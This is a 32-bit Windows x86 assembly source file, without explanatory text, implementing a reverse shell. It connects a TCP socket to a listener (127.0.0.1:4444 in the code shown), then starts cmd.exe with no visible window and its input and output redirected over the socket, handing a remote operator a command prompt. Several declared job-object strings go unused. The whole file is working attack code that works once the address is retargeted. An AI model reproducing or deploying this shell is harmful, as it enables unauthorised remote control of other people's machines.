bits 32

section .data
    wsaData db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00

    sockaddr_in:
        dw 0x0002          
        dw 0x5C11          ; Port 4444 (little-endian)
        dd 0x0100007F      ; IP 127.0.0.1 (little-endian)
        db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00

    ws2_32_dll db 'ws2_32.dll', 0
    kernel32_dll db 'kernel32.dll', 0
    cmd db 'cmd.exe', 0
    CreateJobObject_name db 'CreateJobObjectA', 0
    SetJobObject_name db 'SetInformationJobObject', 0

    jobinfo:
        dd 0, 0, 0, 0 
        dd 0, 0, 0, 0
        dd 2
        dd 0
        dd 0, 0 

section .bss
    hSocket resd 1
    startupinfo resb 68
    processinfo resb 16
    hJob resd 1

section .text
    global Start

extern _LoadLibraryA@4
extern _GetProcAddress@8
extern _WSAStartup@8
extern _WSASocketA@24
extern _connect@12
extern _CreateProcessA@40
extern _WaitForSingleObject@8
extern _CloseHandle@4
extern _CreateJobObjectA@8
extern _SetInformationJobObject@16

Start:
    push edi
    mov edi, startupinfo
    xor eax, eax
    mov ecx, 17            
    rep stosd
    pop edi

    push ws2_32_dll
    call _LoadLibraryA@4
    test eax, eax          
    jz exit

    push wsaData
    push 0x0202            
    call _WSAStartup@8
    test eax, eax
    jnz exit


    push 0
    push 0
    push 0 
    push 6 
    push 1 
    push 2
    call _WSASocketA@24
    mov [hSocket], eax
    cmp eax, -1           
    je exit

    push 16              
    push sockaddr_in      
    push dword [hSocket]  
    call _connect@12
    test eax, eax 
    jnz exit


    mov dword [startupinfo], 68           
    mov dword [startupinfo + 44], 0x101   
    mov dword [startupinfo + 48], 0 
    mov eax, [hSocket]
    mov [startupinfo + 56], eax 
    mov [startupinfo + 60], eax 
    mov [startupinfo + 64], eax 


    push processinfo
    push startupinfo
    push 0 
    push 0       
    push 0x08000000 
    push 1
    push 0 
    push 0 
    push cmd  
    push 0
    call _CreateProcessA@40


    push -1
    push dword [processinfo]
    call _WaitForSingleObject@8

    push dword [processinfo]
    call _CloseHandle@4
    push dword [processinfo + 4] 
    call _CloseHandle@4
    push dword [hSocket] 
    call _CloseHandle@4

exit:
    ret
